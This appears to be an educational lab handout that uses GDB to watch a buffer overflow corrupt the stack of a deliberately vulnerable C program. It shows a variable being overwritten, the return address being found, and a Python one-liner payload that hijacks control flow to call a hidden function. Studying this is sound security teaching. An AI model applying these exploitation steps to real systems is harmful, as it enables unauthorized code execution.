# Buffer Overflow Lab - GDB Debugging Exercise
## Seeing the Exploit in Memory

---

## Objective
Use GDB (GNU Debugger) to examine memory during a buffer overflow attack and visualize how data corrupts the stack.

---

## Prerequisites

1. Compile the program **with debug symbols** (`-g` flag):
```bash
gcc -g -fno-stack-protector -o vulnerable vulnerable.c
```

2. Start GDB:
```bash
gdb ./vulnerable
```

---

## Part 1: Understanding the Stack Layout

### Step 1: Set a breakpoint and run
Inside GDB, type these commands:

```gdb
(gdb) break check_password
(gdb) run
```

**What happened?**
- Program started and stopped at the beginning of `check_password()` function
- You should see the source code around line 10

### Step 2: Examine the stack
```gdb
(gdb) info frame
```

**What you'll see:**
- Stack frame information
- Saved registers
- Current stack pointer (rsp/esp)

### Step 3: Look at local variables
```gdb
(gdb) info locals
```

**Expected output:**
```
buffer = "\000\000\000\000\000\000\000"
authenticated = 0
```

**Key observation:** 
- `buffer` is uninitialized (garbage or zeros)
- `authenticated` starts at 0 (false)

---

## Part 2: Examining Memory Addresses

### Step 4: Find variable addresses
```gdb
(gdb) print &buffer
(gdb) print &authenticated
```

**Example output:**
```
$1 = (char (*)[8]) 0x7fffffffe410
$2 = (int *) 0x7fffffffe418
```

**CRITICAL OBSERVATION:**
Calculate the difference:
- buffer starts at: 0x7fffffffe410
- authenticated at:  0x7fffffffe418
- Difference: 8 bytes (exactly the buffer size!)

This means `authenticated` is **immediately after** the buffer in memory!

### Step 5: Visualize the stack
```gdb
(gdb) x/20xw $rsp
```

**Command breakdown:**
- `x` = examine memory
- `/20` = show 20 units
- `x` = in hexadecimal
- `w` = word size (4 bytes)
- `$rsp` = starting from stack pointer

**What you'll see:**
```
0x7fffffffe410: 0x00000000 0x00000000 0x00000000 0x00000000
0x7fffffffe420: 0x55555040 0x00005555 0xffffe540 0x00007fff
...
```

The first line shows your buffer area!

---

## Part 3: Normal Input (No Overflow)

### Step 6: Continue to the gets() call
```gdb
(gdb) next
```

Type a short password: `hello`

### Step 7: Examine the buffer after input
```gdb
(gdb) print buffer
(gdb) print authenticated
(gdb) x/s &buffer
(gdb) x/2xw &buffer
```

**Expected output:**
```
buffer = "hello\000\000"
authenticated = 0
0x7fffffffe410: "hello"
0x7fffffffe410: 0x6c6c6568 0x0000006f
```

**Analysis:**
- "hello" = 5 characters + null terminator = 6 bytes
- Still within 8-byte buffer
- `authenticated` unchanged = 0
- No overflow occurred!

### Step 8: Check memory hasn't been corrupted
```gdb
(gdb) x/20xw $rsp
```

You'll see "hello" in ASCII hex (68 65 6c 6c 6f) but nothing else changed.

---

## Part 4: The Attack - Overwriting authenticated

### Step 9: Restart with malicious input
```gdb
(gdb) run
```

Enter exactly **12 characters**: `AAAAAAAABBBB`

### Step 10: Examine after overflow
```gdb
(gdb) next
(gdb) print buffer
(gdb) print authenticated
(gdb) x/16xb &buffer
```

**Expected output:**
```
buffer = "AAAAAAAA"
authenticated = 1111638594  (or similar large number)
0x7fffffffe410: 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41
0x7fffffffe418: 0x42 0x42 0x42 0x42
```

**CRITICAL INSIGHT:**
- Buffer shows only "AAAAAAAA" (8 A's)
- The B's (0x42) overwrote `authenticated`!
- `authenticated` now contains "BBBB" interpreted as an integer
- Program will grant access even though password was wrong!

### Step 11: Visual memory layout
```gdb
(gdb) x/4xw &buffer
```

**Output:**
```
0x7fffffffe410: 0x41414141 0x41414141   <- buffer (8 A's)
0x7fffffffe418: 0x42424242 0x????????   <- authenticated (4 B's)
```

The overflow is now **visible**!

---

## Part 5: Massive Overflow - Corrupting Return Address

### Step 12: Restart with large input
```gdb
(gdb) run
```

Enter 32 characters: `AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`

### Step 13: Step through carefully
```gdb
(gdb) next    # Past gets()
(gdb) next    # Past strcmp()
(gdb) next    # Past if statement
(gdb) next    # Try to return...
```

**BOOM!** Program crashes!

### Step 14: Examine the crash
```gdb
(gdb) backtrace
```

**Expected output:**
```
#0  0x4141414141414141 in ?? ()
#1  0x4141414141414141 in ?? ()
#2  0x0000000000000000 in ?? ()
```

**What happened?**
- 0x41 = ASCII 'A'
- The return address was overwritten with 'AAAA...'
- CPU tried to jump to address 0x4141414141414141
- Invalid address → Segmentation fault!

### Step 15: Examine the destroyed stack
```gdb
(gdb) x/40xw &buffer
```

You'll see A's (0x41) everywhere - the entire stack is corrupted!

---

## Part 6: Advanced - Finding Exact Offsets

### Step 16: Calculate exact overflow distances

Let's find exactly how many bytes until we hit the return address:

```gdb
(gdb) break check_password
(gdb) run
(gdb) info frame
```

Look for "saved rip" (return instruction pointer) - note the address.

```gdb
(gdb) print &buffer
```

Subtract buffer address from saved rip address to find the offset.

**Typical layout (64-bit):**
```
buffer:       +0    (8 bytes)
authenticated: +8    (4 bytes)
padding:      +12   (4 bytes alignment)
saved rbp:    +16   (8 bytes)
return addr:  +24   (8 bytes)
```

So you need 24 bytes of junk, then 8 bytes for return address!

---

## Part 7: Challenge - Call secret_function()

### Step 17: Find the address of secret_function
```gdb
(gdb) print &secret_function
```

**Example output:**
```
$1 = (void (*)(void)) 0x555555555169
```

### Step 18: Craft the exploit
To call secret_function, you need:
1. 24 bytes of padding
2. Address of secret_function (in little-endian)

Create a Python exploit:
```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x69\x51\x55\x55\x55\x55\x00\x00')" | ./vulnerable
```

**Note:** Addresses change between runs! Use `print &secret_function` in GDB to find the current address.

---

## Common GDB Commands Reference

| Command | Purpose |
|---------|---------|
| `break function` | Set breakpoint at function |
| `run` | Start program |
| `next` | Execute next line (step over) |
| `step` | Execute next line (step into) |
| `continue` | Continue execution |
| `print var` | Show variable value |
| `print &var` | Show variable address |
| `info locals` | Show all local variables |
| `info frame` | Show stack frame info |
| `x/NFU addr` | Examine memory (N=count, F=format, U=unit) |
| `backtrace` | Show call stack |
| `quit` | Exit GDB |

### Memory Examination Formats
- `x/x` - hexadecimal
- `x/d` - decimal
- `x/s` - string
- `x/i` - instruction
- `x/c` - character

### Memory Units
- `b` - byte (1 byte)
- `h` - halfword (2 bytes)
- `w` - word (4 bytes)
- `g` - giant word (8 bytes)

---

## What You Should Have Learned

1. **Memory Layout:**
   - Stack grows downward
   - Local variables stored contiguously
   - Buffer next to authenticated variable

2. **Buffer Overflow Mechanics:**
   - gets() doesn't check bounds
   - Extra data spills into adjacent memory
   - Can corrupt variables, return addresses, etc.

3. **Exploitation:**
   - Overwriting adjacent variables changes program behavior
   - Overwriting return address controls execution flow
   - Precise control requires knowing exact memory layout

4. **Real-world Implications:**
   - Attackers use these techniques for code execution
   - Debug symbols removed in production (harder to exploit)
   - Modern protections (ASLR, stack canaries) make this harder

---

## Lab Report Questions

1. What is the exact address difference between `buffer` and `authenticated` on your system?

2. How many characters does it take to overwrite `authenticated`?

3. What value did `authenticated` contain after you entered 12 A's?

4. How many bytes of padding are needed to reach the return address?

5. Were you able to successfully call `secret_function()`? If so, what address did you use?

6. Why does the address of `secret_function()` change between runs? (Hint: research ASLR)

---

## Safety Reminder

⚠️ **This knowledge is for defense, not attack!**

Understanding vulnerabilities helps you:
- Write secure code
- Recognize dangerous patterns
- Design better defenses
- Appreciate modern security features

Never use these techniques on systems you don't own or without explicit permission.
